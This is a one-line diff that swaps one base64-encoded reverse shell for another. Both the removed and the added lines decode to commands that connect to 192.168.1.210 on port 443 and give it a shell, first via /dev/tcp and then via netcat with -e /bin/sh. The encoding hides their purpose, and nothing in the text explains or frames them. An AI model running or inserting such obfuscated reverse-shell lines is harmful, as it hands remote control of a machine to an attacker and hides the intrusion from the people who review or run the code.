@@ -1,1 +1,1 @@
-base64 -d <<< c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjIxMC80NDMgMD4mMQ== | bash
+echo bmMgMTkyLjE2OC4xLjIxMCA0NDMgLWUgL2Jpbi9zaA== | base64 -d | sh
